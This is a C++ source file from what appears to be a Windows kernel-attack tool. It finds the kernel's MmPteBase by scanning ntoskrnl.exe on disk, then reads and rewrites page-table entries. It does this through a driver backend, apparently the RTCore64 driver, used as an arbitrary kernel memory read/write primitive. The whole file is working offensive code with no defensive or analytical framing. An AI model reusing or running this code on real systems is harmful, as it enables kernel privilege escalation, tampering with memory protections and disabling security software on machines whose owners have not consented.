#include "pte.h"
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include <cstdio>
#include <vector>
#include <map>
#include <algorithm>
#include <utility>
#include <Psapi.h>

static DWORD64 s_pteBase = 0;

void PteResetCache() { s_pteBase = 0; }

// Scan ntoskrnl.exe on disk for the most-referenced .data global
// (MOV r64,[RIP+offset] pointing into .data).
// On Windows 10 22H2, MmPteBase at RVA 0xC124D0 has ~1302 references —
// far more than any other global — making it unambiguous.
// Returns the kernel VA of the MmPteBase *variable* (not its value).
static DWORD64 FindMmPteBaseByRefScan() {
    // Get ntoskrnl path
    LPVOID d[1024]; DWORD cb;
    if (!EnumDeviceDrivers(d, sizeof(d), &cb)) return 0;
    DWORD64 kBase = (DWORD64)d[0];

    WCHAR drvPath[MAX_PATH], filePath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(d[0], drvPath, MAX_PATH)) return 0;
    if (_wcsnicmp(drvPath, L"\\SystemRoot\\", 12) == 0) {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\%s", winDir, drvPath + 12);
    } else {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\System32\\ntoskrnl.exe", winDir);
    }

    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(hf, NULL);
    std::vector<BYTE> buf(sz);
    DWORD rd; bool ok = ReadFile(hf, buf.data(), sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) return 0;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto* sec = IMAGE_FIRST_SECTION(nt); WORD nSec = nt->FileHeader.NumberOfSections;

    auto rva2foa = [&](DWORD rva) -> DWORD {
        for (WORD i = 0; i < nSec; i++) {
            DWORD vb = sec[i].VirtualAddress, vend = vb + sec[i].SizeOfRawData;
            if (rva >= vb && rva < vend) return sec[i].PointerToRawData + (rva - vb);
        } return 0;
    };

    // Locate .text and .data sections
    DWORD textRVA = 0, textFOA = 0, textSz = 0;
    DWORD dataRVA = 0, dataEnd = 0;
    for (WORD i = 0; i < nSec; i++) {
        char name[9] = {};
        memcpy(name, sec[i].Name, 8);
        if (strcmp(name, ".text") == 0) {
            textRVA = sec[i].VirtualAddress; textFOA = sec[i].PointerToRawData; textSz = sec[i].SizeOfRawData;
        } else if (strcmp(name, ".data") == 0) {
            dataRVA = sec[i].VirtualAddress;
            // Use VirtualSize (not SizeOfRawData) so the BSS tail is included.
            // MmPteBase is a runtime-initialised global; it may be in BSS where
            // SizeOfRawData < VirtualSize.  The on-disk bytes there are zero but
            // the running kernel populates the value, and our scan looks for
            // MOV r64,[RIP+imm32] targets in this range — the offset is what we
            // store, not the on-disk value.
            dataEnd = dataRVA + sec[i].Misc.VirtualSize;
        }
    }
    if (!textFOA || !dataRVA) return 0;

    // Count RIP-relative 64-bit loads (MOV r64,[RIP+imm32]) targeting .data
    std::map<DWORD, int> refCnt;
    DWORD end = textFOA + textSz;
    for (DWORD i = textFOA; i + 7 < end; i++) {
        BYTE rex = buf[i], op = buf[i+1], modrm = buf[i+2];
        // REX.W (0x48/0x4C) + MOV (0x8B) + ModRM with mod=00,rm=101 (RIP-rel) and any reg
        if ((rex == 0x48 || rex == 0x4C) && op == 0x8B && (modrm & 0xC7) == 0x05) {
            INT32 off32 = *reinterpret_cast<INT32*>(&buf[i + 3]);
            DWORD instrRVA = (i - textFOA) + textRVA;
            DWORD targetRVA = (DWORD)((INT64)instrRVA + 7 + off32);
            if (targetRVA >= dataRVA && targetRVA < dataEnd)
                refCnt[targetRVA]++;
        }
    }
    if (refCnt.empty()) return 0;

    // Collect top-16 candidates by reference count.
    // We cannot safely assume the single most-referenced variable is MmPteBase —
    // on some patch levels another high-frequency .data global (e.g. a timer or
    // lock) can exceed MmPteBase's count.  Instead we try the top-N in order
    // and pick the first whose *runtime value* looks like a valid kernel pointer
    // aligned to at least 4 KB (PTE arrays are always page-aligned).
    std::vector<std::pair<int,DWORD>> topN;
    topN.reserve(refCnt.size());
    for (auto& kv : refCnt) topN.push_back({kv.second, kv.first});
    std::sort(topN.begin(), topN.end(), [](auto& a, auto& b){ return a.first > b.first; });
    if (topN[0].first < 50) return 0;  // nothing looks plausible

    for (size_t rank = 0; rank < topN.size() && rank < 16; rank++) {
        DWORD  rva   = topN[rank].second;
        int    cnt   = topN[rank].first;
        DWORD64 varVA = kBase + rva;
        DWORD64 val  = g_drv->Rd64(varVA);

        // MmPteBase must be a kernel VA aligned to at least 4 KB.
        // Time/counter variables are large monotonic integers, never valid VAs.
        if (!g_drv->IsKernelVA(val)) {
            printf("[pte] skip RVA=0x%08X refs=%d val=0x%016llX (not kernel VA)\n",
                   rva, cnt, val);
            continue;
        }
        if (val & 0xFFF) {
            printf("[pte] skip RVA=0x%08X refs=%d val=0x%016llX (not page-aligned)\n",
                   rva, cnt, val);
            continue;
        }
        printf("[pte] MmPteBase scan: RVA=0x%08X refs=%d rank=%zu  value=0x%016llX\n",
               rva, cnt, rank, val);
        return varVA;
    }
    printf("[pte] MmPteBase scan: no valid candidate in top-16\n");
    return 0;
}

DWORD64 GetMmPteBase() {
    if (s_pteBase) return s_pteBase;

    // Try export table first (present on some RS3+ builds)
    DWORD64 varVA = KUtil::KernelExport("MmPteBase");

    // Fall back to reference-count scan of ntoskrnl.exe on disk
    if (!varVA) varVA = FindMmPteBaseByRefScan();

    if (!varVA) {
        printf("[pte] MmPteBase: both export lookup and scan failed\n");
        return 0;
    }

    DWORD64 base = g_drv->Rd64(varVA);
    if (!g_drv->IsKernelVA(base)) {
        printf("[pte] MmPteBase value 0x%016llX is not a kernel VA\n", base);
        return 0;
    }

    printf("[pte] MmPteBase = 0x%016llX (via %s)\n", base,
           KUtil::KernelExport("MmPteBase") ? "export" : "scan");
    s_pteBase = base;
    return s_pteBase;
}

void SetMmPteBase(DWORD64 val) {
    s_pteBase = val;
    printf("[pte] MmPteBase manually set to 0x%016llX\n", val);
}

// Print top-32 reference-count candidates and their runtime values — diagnostic only.
void CmdPteBaseScan() {
    // Re-use FindMmPteBaseByRefScan internals by temporarily clearing cache
    // and running the full scan with verbose output.
    // We print ALL candidates regardless of whether they pass validation.

    LPVOID d[1024]; DWORD cb;
    if (!EnumDeviceDrivers(d, sizeof(d), &cb)) { printf("[!] EnumDeviceDrivers failed\n"); return; }
    DWORD64 kBase = (DWORD64)d[0];

    WCHAR drvPath[MAX_PATH], filePath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(d[0], drvPath, MAX_PATH)) { printf("[!] GetDeviceDriverFileName failed\n"); return; }
    if (_wcsnicmp(drvPath, L"\\SystemRoot\\", 12) == 0) {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\%s", winDir, drvPath + 12);
    } else {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\System32\\ntoskrnl.exe", winDir);
    }

    printf("[pte] ntoskrnl base = 0x%016llX\n", kBase);
    printf("[pte] file = %ws\n\n", filePath);

    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) { printf("[!] Cannot open ntoskrnl.exe\n"); return; }
    DWORD sz = GetFileSize(hf, NULL);
    std::vector<BYTE> buf(sz);
    DWORD rd; bool ok = ReadFile(hf, buf.data(), sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) { printf("[!] ReadFile failed\n"); return; }

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buf.data());
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(buf.data() + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt); WORD nSec = nt->FileHeader.NumberOfSections;

    DWORD textRVA = 0, textFOA = 0, textSz = 0;
    DWORD dataRVA = 0, dataEnd = 0;
    for (WORD i = 0; i < nSec; i++) {
        char name[9] = {}; memcpy(name, sec[i].Name, 8);
        if (strcmp(name, ".text") == 0) {
            textRVA = sec[i].VirtualAddress; textFOA = sec[i].PointerToRawData; textSz = sec[i].SizeOfRawData;
        } else if (strcmp(name, ".data") == 0) {
            dataRVA = sec[i].VirtualAddress; dataEnd = dataRVA + sec[i].Misc.VirtualSize;
        }
    }
    printf("[pte] .text RVA=0x%08X  .data RVA=0x%08X..0x%08X\n\n", textRVA, dataRVA, dataEnd);

    std::map<DWORD,int> refCnt;
    DWORD end = textFOA + textSz;
    for (DWORD i = textFOA; i + 7 < end; i++) {
        BYTE rex = buf[i], op = buf[i+1], modrm = buf[i+2];
        if ((rex == 0x48 || rex == 0x4C) && op == 0x8B && (modrm & 0xC7) == 0x05) {
            INT32 off32 = *reinterpret_cast<INT32*>(&buf[i + 3]);
            DWORD instrRVA = (i - textFOA) + textRVA;
            DWORD targetRVA = (DWORD)((INT64)instrRVA + 7 + off32);
            if (targetRVA >= dataRVA && targetRVA < dataEnd) refCnt[targetRVA]++;
        }
    }

    std::vector<std::pair<int,DWORD>> topN;
    topN.reserve(refCnt.size());
    for (auto& kv : refCnt) topN.push_back({kv.second, kv.first});
    std::sort(topN.begin(), topN.end(), [](auto& a, auto& b){ return a.first > b.first; });

    printf("  %-4s  %-10s  %-8s  %-18s  %s\n", "Rank", "RVA", "Refs", "RuntimeValue", "Status");
    printf("  %-4s  %-10s  %-8s  %-18s  %s\n", "----", "----------", "--------", "------------------", "------");

    size_t limit = topN.size() < 32 ? topN.size() : 32;
    for (size_t rank = 0; rank < limit; rank++) {
        DWORD   rva  = topN[rank].second;
        int     cnt  = topN[rank].first;
        DWORD64 varVA = kBase + rva;
        DWORD64 val  = g_drv->Rd64(varVA);

        const char* status;
        if (!g_drv->IsKernelVA(val))  status = "not-kernel-VA";
        else if (val & 0xFFF)         status = "not-page-aligned";
        else                          status = "*** CANDIDATE ***";

        printf("  %-4zu  0x%08X  %-8d  0x%016llX  %s\n", rank, rva, cnt, val, status);
    }
    printf("\n  Total unique .data targets referenced: %zu\n", refCnt.size());
}

// Each PTE covers 4096 bytes.  Byte offset into PTE array = (va >> 12) * 8 = va >> 9.
// Works for the full canonical 48-bit VA space.
DWORD64 PteVaOf(DWORD64 va) {
    DWORD64 base = GetMmPteBase();
    if (!base) return 0;
    // Strip sign extension bits (keep low 48 bits for the shift)
    DWORD64 idx = (va & 0x0000FFFFFFFFFFFFULL) >> 9;
    return base + idx;
}

PteInfo ReadPte(DWORD64 va) {
    PteInfo info{};
    info.pte_va = PteVaOf(va);
    if (!info.pte_va || !g_drv->IsKernelVA(info.pte_va)) {
        info.valid = false;
        return info;
    }

    info.valid    = true;
    info.pte_val  = g_drv->Rd64(info.pte_va);
    info.page_pa  = info.pte_val & PTE_PA_MASK;
    info.present   = (info.pte_val & PTE_PRESENT) != 0;
    info.writable  = (info.pte_val & PTE_WRITE)   != 0;
    info.user      = (info.pte_val & PTE_USER)     != 0;
    info.executable= (info.pte_val & PTE_NX)       == 0;
    return info;
}

bool WritePte(DWORD64 va, DWORD64 newPteVal) {
    DWORD64 pteVA = PteVaOf(va);
    if (!pteVA || !g_drv->IsKernelVA(pteVA)) return false;

    // Attempt a true 8-byte atomic write.
    //
    // On x86-64, an aligned 8-byte store is single-copy atomic (Intel SDM §8.2.3.1).
    // PTEs are 8-byte aligned by construction (PTE array is a contiguous QWORD[]).
    //
    // RTCore64Backend::Wr64Atomic sends IOCTL_WRITE with Size=8.  If the kernel
    // handler does *(QWORD*)addr = *(QWORD*)&op->Value it becomes one MOV QWORD →
    // no window of inconsistency at all.  If the driver rejects Size=8 it falls back
    // to the hi→lo two-write sequence (Present=1 throughout, brief PA inconsistency).
    //
    // Either way the write completes before this function returns.
    bool atomic = g_drv->Wr64Atomic(pteVA, newPteVal);
    printf("[pte] WritePte VA=0x%016llX PTE=0x%016llX (%s)\n",
           va, newPteVal, atomic ? "ATOMIC 8B" : "hi-lo fallback");
    return true;
}
